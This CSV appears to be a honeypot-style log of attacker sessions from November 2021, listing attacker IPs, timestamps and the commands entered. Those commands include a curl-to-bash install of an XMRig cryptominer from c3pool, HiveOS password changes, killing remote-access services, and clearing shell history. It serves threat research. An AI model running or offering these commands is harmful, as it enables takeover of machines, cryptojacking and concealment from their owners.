attackdate,attackerip,entrancetime,exittime,commands
2021-11-26,10.0.3.239,20:47:34.165,21:00:01.647,"[""uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr""]"
2021-11-15,10.0.3.189,21:04:42.856,21:27:10.934,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-18,10.0.3.91,21:20:18.038,21:20:19.017,['uname -s -v -n -r -m']
2021-11-22,10.0.3.135,21:13:31.203,21:24:18.495,['curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45dNkjTQGgT77r9AEMyHdCGan5tpuekXaHFhFW99dQ8hUS35oZQEYXddFE52jxVdfUNrAD4ZyZ44BgHfgk5SjHdoLjGdJnQ']
2021-11-15,10.0.3.103,21:39:46.204,21:39:47.010,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.97,21:44:58.793,22:00:02.008,"['sudo hive-passwd c3Rvcnl0aW1lIGRheW9uZSBhbmQgZGF5dHdevbase64', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-15,10.0.3.13,22:16:58.423,22:17:00.207,"['sudo hive-passwd f5123', 'sudo pkill Xorg', 'sudo pkill x11vnc']"
2021-11-17,10.0.3.120,22:29:19.454,22:29:22.113,"['sudo hive-passwd Tmlrb2xhaV9QdXBhbm92X01vamVfRGFfR29fUG9sYXBh_base64', 'pkill Xorg', 'pkill x11vnc', 'pkill Hello', 'systemctl stop shellinabox', 'history -c']"
2021-11-25,10.0.3.166,22:23:43.837,22:24:04.511,['scp -t /tmp/MDnMnXLc']
2021-11-15,10.0.3.187,22:49:45.770,22:49:47.679,[]
2021-11-16,10.0.3.119,23:05:14.677,23:23:39.201,[]
2021-11-17,10.0.3.88,23:03:15.451,23:06:13.241,[]
